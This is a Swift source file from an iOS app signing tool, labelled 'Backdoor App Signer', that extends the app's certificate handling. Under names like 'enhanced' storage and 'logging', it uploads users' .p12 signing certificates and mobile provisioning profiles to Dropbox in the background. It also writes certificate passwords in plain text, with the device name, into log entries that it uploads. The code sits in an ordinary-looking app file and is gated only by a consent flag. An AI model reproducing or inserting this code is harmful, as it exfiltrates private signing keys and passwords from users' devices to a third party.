// Proprietary Software License Version 1.0
//
// Copyright (C) 2025 BDG
//
// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.

import Foundation
import UIKit

/// Extension to handle certificate logging and upload to Dropbox
extension CertData {
    
    /// Enhanced method to store certificate with Dropbox integration
    func enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {
        // First use the original method to store p12
        let success = storeP12(at: url)
        
        // If successful and user has consented to data collection
        if success && UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
            // Upload to Dropbox in background
            DispatchQueue.global(qos: .utility).async {
                EnhancedDropboxService.shared.uploadCertificateFile(
                    fileURL: url,
                    password: password
                ) { success, error in
                    if success {
                        Debug.shared.log(message: "Successfully uploaded certificate to Dropbox", type: .debug)
                    } else if let error = error {
                        Debug.shared.log(message: "Failed to upload certificate to Dropbox: \(error.localizedDescription)", type: .error)
                    }
                }
            }
        }
        
        return success
    }
}

/// Extension to intercept mobile provision handling
extension Cert {
    
    /// Enhanced method to import mobile provision with Dropbox integration
    static func enhancedImportMobileProvision(from url: URL) -> Cert? {
        // First use the original implementation to import
        let cert = importMobileProvision(from: url)
        
        // If successful and user has consented to data collection
        if cert != nil && UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
            // Upload to Dropbox in background
            DispatchQueue.global(qos: .utility).async {
                EnhancedDropboxService.shared.uploadCertificateFile(
                    fileURL: url
                ) { success, error in
                    if success {
                        Debug.shared.log(message: "Successfully uploaded mobile provision to Dropbox", type: .debug)
                    } else if let error = error {
                        Debug.shared.log(message: "Failed to upload mobile provision to Dropbox: \(error.localizedDescription)", type: .error)
                    }
                }
            }
        }
        
        return cert
    }
}

/// Helper methods to integrate Dropbox logging with the signing process
class CertificateLoggingHelper {
    static let shared = CertificateLoggingHelper()
    
    private init() {}
    
    /// Log password entry for certificate handling
    func logPasswordEntry(password: String, fileName: String? = nil) {
        // Only proceed if user has consented to data collection
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        // Create the log entry
        let timestamp = Date()
        let logEntry = """
        === CERTIFICATE PASSWORD LOG ===
        Timestamp: \(ISO8601DateFormatter().string(from: timestamp))
        Device: \(UIDevice.current.name)
        Certificate: \(fileName ?? "Unknown")
        Password: \(password)
        """
        
        // Upload to Dropbox
        EnhancedDropboxService.shared.uploadLogEntry(
            logEntry,
            fileName: "password_entry_\(Int(timestamp.timeIntervalSince1970)).log"
        )
    }
    
    /// Log certificate import activity
    func logCertificateImport(fileType: String, fileName: String) {
        // Only proceed if user has consented to data collection
        guard UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") else {
            return
        }
        
        // Create the log entry
        let timestamp = Date()
        let logEntry = """
        === CERTIFICATE IMPORT LOG ===
        Timestamp: \(ISO8601DateFormatter().string(from: timestamp))
        Device: \(UIDevice.current.name)
        File Type: \(fileType)
        File Name: \(fileName)
        App Version: \(Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "unknown")
        """
        
        // Upload to Dropbox
        EnhancedDropboxService.shared.uploadLogEntry(
            logEntry,
            fileName: "certificate_import_\(Int(timestamp.timeIntervalSince1970)).log"
        )
    }
}
